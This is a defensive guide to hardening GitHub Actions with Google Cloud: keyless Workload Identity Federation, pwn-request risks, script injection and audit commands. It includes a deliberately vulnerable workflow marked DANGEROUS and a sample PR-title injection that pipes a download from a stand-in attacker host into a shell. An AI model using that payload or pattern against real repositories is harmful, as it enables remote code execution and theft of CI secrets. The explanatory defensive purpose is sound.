# Security Hardening

Companion to the `ci-cd-github-actions` skill: keyless Google Cloud access and
the attacks that matter most for GitHub Actions. Every IAM or repository-setting
change below needs the user's explicit confirmation before it runs.

## Workload Identity Federation for GitHub Actions

```bash
PROJECT_ID=my-project
PROJECT_NUMBER=$(gcloud projects describe "$PROJECT_ID" --format='value(projectNumber)')
# PowerShell: $PROJECT_ID = "my-project"; $PROJECT_NUMBER = gcloud projects describe $PROJECT_ID --format='value(projectNumber)'

gcloud iam workload-identity-pools create github \
  --project="$PROJECT_ID" --location=global --display-name="GitHub Actions"

gcloud iam workload-identity-pools providers create-oidc my-repo \
  --project="$PROJECT_ID" --location=global --workload-identity-pool=github \
  --display-name="my-org/my-repo" \
  --issuer-uri="https://token.actions.githubusercontent.com" \
  --attribute-mapping="google.subject=assertion.sub,attribute.repository=assertion.repository,attribute.repository_id=assertion.repository_id,attribute.ref=assertion.ref" \
  --attribute-condition="assertion.repository_id == '123456789'"

gcloud iam service-accounts add-iam-policy-binding "deployer@$PROJECT_ID.iam.gserviceaccount.com" \
  --project="$PROJECT_ID" --role=roles/iam.workloadIdentityUser \
  --member="principalSet://iam.googleapis.com/projects/$PROJECT_NUMBER/locations/global/workloadIdentityPools/github/attribute.repository_id/123456789"

# The value for the auth action's workload_identity_provider input:
gcloud iam workload-identity-pools providers describe my-repo \
  --project="$PROJECT_ID" --location=global --workload-identity-pool=github --format='value(name)'
```

- **Always set an attribute condition.** Without one, any GitHub repository can
  mint tokens against the provider. Condition on the numeric
  `repository_id` (get it with `gh api repos/my-org/my-repo --jq .id`) rather
  than the name, so a deleted-and-recreated repository with the same name does
  not inherit access.
- **Scope production to an environment.** The token's `sub` claim for a job with
  `environment: production` is `repo:my-org/my-repo:environment:production`.
  Bind the production deployer only to that subject:
  `--member="principal://iam.googleapis.com/projects/$PROJECT_NUMBER/locations/global/workloadIdentityPools/github/subject/repo:my-org/my-repo:environment:production"`.
- **Require a specific reusable workflow** for deploys by mapping and
  conditioning on the `job_workflow_ref` claim.
- **Direct resource access** (granting roles to the `principalSet://` member
  itself, with no service account) also works for many Google APIs; the
  service-account pattern above is the most broadly supported.

## Pwn requests (`pull_request_target`)

`pull_request_target` runs the base branch's workflow with secrets and a write
token, even for pull requests from forks. It becomes an exploit the moment it
executes code from the pull request:

```yaml
# DANGEROUS: never do this
on: pull_request_target
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # attacker's code
      - run: npm ci && npm test                            # runs it with your secrets
```

Safe split when fork PRs need privileged follow-up (for example a comment with
results):

1. A `pull_request` workflow builds and tests with no secrets and uploads the
   results as an artifact.
2. A `workflow_run` workflow downloads that artifact, treats it strictly as data
   (validate size and format, never execute or `source` it, never extract it
   over the workspace), and posts the comment with `pull-requests: write` only.

Use `pull_request_target` only for metadata tasks (labelling, triage) that never
check out or run PR code.

## Script injection

Any `${{ }}` expression is substituted into the script text before the shell
runs. Attacker-controlled fields include PR titles and bodies, issue and comment
bodies, branch names (`github.head_ref`), commit messages and author names.

```yaml
# Vulnerable: a title like  x"; curl attacker.example | sh; echo "  runs as code
- run: echo "Title: ${{ github.event.pull_request.title }}"

# Safe: the value arrives as an environment variable and is only ever data
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "Title: $TITLE"
```

The same applies to `actions/github-script` (`script:` input): read
`context.payload` inside the script instead of interpolating.

## Other hardening

| Risk | Control |
| :--- | :--- |
| Token left in `.git/config` for later steps | `persist-credentials: false` on `actions/checkout` |
| Derived secret printed in logs | `echo "::add-mask::$VALUE"` before any use; never `set -x` around secrets |
| Unreviewed workflow edits | `CODEOWNERS` entry for `/.github/workflows/` and a ruleset requiring code-owner review |
| Fork PRs consuming runners or probing | Require approval for workflows from outside contributors (repository Actions settings) |
| Self-hosted runner compromise | Never attach self-hosted runners to public repositories; prefer ephemeral, single-job runners |
| Cache poisoning from privileged triggers | Do not restore or save caches in `pull_request_target` jobs |
| Third-party action takeover | SHA pins, Dependabot, and an allow-list of actions in organization settings |
| Long-lived cloud credentials | Workload Identity Federation; delete old key secrets and the keys themselves after migration |

## Audit commands

```bash
actionlint                    # syntax, expression and shellcheck errors
zizmor .                      # injection, permissions, pinning and trigger risks
git grep -nE "pull_request_target|workflow_run" .github/workflows
git grep -nE "uses: [^ ]+@" .github/workflows | grep -vE "@[0-9a-f]{40}"   # actions not pinned to a SHA
```

PowerShell equivalents:

```powershell
Select-String -Path .github/workflows/*.yml -Pattern 'pull_request_target|workflow_run'
Select-String -Path .github/workflows/*.yml -Pattern 'uses: \S+@' | Where-Object { $_.Line -notmatch '@[0-9a-f]{40}' }
```
